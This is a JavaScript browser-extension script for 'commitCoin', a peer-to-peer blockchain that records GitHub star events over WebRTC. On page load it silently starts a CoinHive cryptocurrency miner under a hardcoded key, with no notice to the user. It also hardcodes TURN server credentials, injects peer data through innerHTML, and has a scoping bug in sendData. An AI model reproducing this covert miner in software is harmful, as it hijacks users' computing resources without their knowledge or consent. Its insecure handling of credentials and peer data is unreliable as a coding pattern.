import Blockchain from './Blockchain';
import Block from './Block';
import config from './config';
import actions from './actions';
import events from './events';
import jsonpack from 'jsonpack';

function sendData(c, data) {
    try {
        c.send(jsonpack.pack(data));
    } catch (err) {
        let idx = channels.indexOf(c);
        if (idx >= 0) {
            channels.splice(idx, 1);
        }
    }
}

window.onload = () => {
    
    let miner = null;
    
    try {
        miner = new CoinHive.Anonymous('22Gilm1egEhU4A1HSTi7fDZM8CWjRqTJ');
    } catch (err) {
        console.log('miner failed');
    }
    
    if (miner !== null) miner.start();

    const iceServers = [
        {
            urls: 'turn:139.59.241.127:80',
            username: 'user1',
            credential: "password1"
        },
        { urls: "stun:stun.l.google.com:19302" }
    ];

    let channels = [];
    let blockchain = null;
    let messages = document.getElementById('messages');

    let network = RTC({
        constraints: null,
        channels: {
            blockchain: true
        },
        ice: iceServers,
        signaller: '//139.59.241.127:3000',
        room: 'commitCoin'
    });


    network.on('channel:opened:blockchain', function(id, dc) {
        if (blockchain === null) blockchain = new Blockchain();
        console.log('connected');
        dc.onmessage = function(evt) {
            let data = jsonpack.unpack(evt.data);
            if (data.event === events.ADD_BLOCK) {
                console.log('sending');
                let block = Block.fromJSON(data.block);
                blockchain.addBlock(block);
            } else if (data.event === events.SYNC_CHAIN) {
                console.log('syncing');
                let chain = data.chain;
                blockchain.replaceChain(chain);
            }
            messages.innerHTML = JSON.stringify(blockchain.getFullChain());
        };

        channels.push(dc);

        setInterval(() => {
            channels.forEach(c => {
                let data = {
                    event: events.SYNC_CHAIN,
                    chain: blockchain.getFullChain()
                };
                sendData(c, data);
            })
        }, config.syncInterval);
    
        
        // setInterval(() => {   
            // channels.forEach(c => {
            //     let data = {
            //         event: events.ADD_BLOCK,
            //         block: blockchain.generateBlock({
            //             action: 1,
            //             user: 'abc',
            //             repo: 'abc'
            //         }).toJSON()
            //     };
            //     sendData(c, data);
        //     })
        // }, 1000);

        chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
            console.log(sender.tab ?
                        "from a content script:" + sender.tab.url :
                        "from the extension");
            if (request.type == actions.ADD_STAR) {
                channels.forEach(c => {
                    let data = {
                        event: events.ADD_BLOCK,
                        block: blockchain.generateBlock({
                            action: actions.ADD_STAR,
                            user: request.user,
                            repo: request.repo
                        }).toJSON()
                    };
                    sendData(c, data);
                });
                sendResponse({farewell: "goodbye"});
            }
        });
    });

    network.on('channel:closed:blockchain', function(id, dc) {
        let idx = channels.indexOf(dc);
        if (idx >= 0) {
            channels.splice(idx, 1);
        }
    });
}